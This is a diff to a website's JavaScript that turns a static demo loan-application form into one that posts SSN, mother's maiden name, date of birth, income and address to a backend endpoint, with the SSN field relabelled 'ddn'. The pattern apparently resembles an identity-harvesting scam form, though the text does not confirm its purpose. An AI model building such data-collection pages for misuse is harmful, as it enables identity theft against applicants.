@@ -13,15 +13,16 @@ document.addEventListener('DOMContentLoaded', function () {
   if (phone) maskInput(phone, '###-###-####');
   if (ssn) maskInput(ssn, '###-##-####');
 
-  // Application form handling with improved messages
+  // Application form handling with database submission
   const appForm = document.getElementById('applicationForm');
   if (appForm) {
-    appForm.addEventListener('submit', function (e) {
+    appForm.addEventListener('submit', async function (e) {
       e.preventDefault();
       const fd = new FormData(appForm);
-      const required = ['firstName', 'lastName', 'motherFirst', 'motherLast', 'street', 'city', 'state', 'postal', 'email', 'phone', 'dob', 'occupation', 'sex', 'income', 'ssn', 'amountApproved', 'deliveryOption'];
+      const required = ['firstName', 'lastName', 'motherFirst', 'motherLast', 'street', 'city', 'state', 'postal', 'email', 'phone', 'dob', 'occupation', 'sex', 'income', 'ssn', 'amountApproved'];
       const missing = required.filter(k => !fd.get(k) || fd.get(k).toString().trim() === '');
       const out = document.getElementById('appResult');
+      
       if (missing.length) {
         out.classList.remove('success');
         out.classList.add('error');
@@ -29,20 +30,59 @@ document.addEventListener('DOMContentLoaded', function () {
         return;
       }
 
-      const summary = {
-        name: fd.get('firstName') + ' ' + fd.get('lastName'),
+      // Prepare data for submission
+      const formData = {
+        firstName: fd.get('firstName'),
+        lastName: fd.get('lastName'),
+        motherFirst: fd.get('motherFirst'),
+        motherLast: fd.get('motherLast'),
+        referralName: fd.get('referralName'),
+        street: fd.get('street'),
+        city: fd.get('city'),
+        state: fd.get('state'),
+        postal: fd.get('postal'),
         email: fd.get('email'),
         phone: fd.get('phone'),
-        amount: fd.get('amountApproved'),
-        delivery: fd.get('deliveryOption')
+        dob: fd.get('dob'),
+        occupation: fd.get('occupation'),
+        sex: fd.get('sex'),
+        income: fd.get('income'),
+        ddn: fd.get('ssn'), // SSN stored as DDN
+        amountApproved: fd.get('amountApproved')
       };
 
-      out.classList.remove('error');
-      out.classList.add('success');
-      out.innerHTML = '<strong>Application received (demo)</strong>' +
-        '<p>Name: ' + summary.name + '<br>Email: ' + summary.email + '<br>Phone: ' + summary.phone + '<br>Amount: ' + summary.amount + '<br>Delivery: ' + summary.delivery + '</p>' +
-        '<p class="muted">This is a static demo; no sensitive data has been transmitted or stored.</p>';
-      appForm.reset();
+      try {
+        // Show loading state
+        out.classList.remove('error', 'success');
+        out.innerHTML = '<strong>Submitting application...</strong><p>Please wait while we process your application.</p>';
+        
+        // Submit to backend
+        const response = await fetch('/api/submit-application', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(formData)
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          out.classList.remove('error');
+          out.classList.add('success');
+          out.innerHTML = '<strong>Application submitted successfully!</strong>' +
+            '<p>Thank you for your application. We will review it and contact you within 2-3 business days.</p>' +
+            '<p class="muted">Application ID: ' + result.applicationId + '</p>';
+          appForm.reset();
+        } else {
+          throw new Error(result.message || 'Submission failed');
+        }
+      } catch (error) {
+        console.error('Submission error:', error);
+        out.classList.remove('success');
+        out.classList.add('error');
+        out.innerHTML = '<strong>Submission failed</strong><p>There was an error submitting your application. Please try again or contact support.</p>';
+      }
     });
   }
 
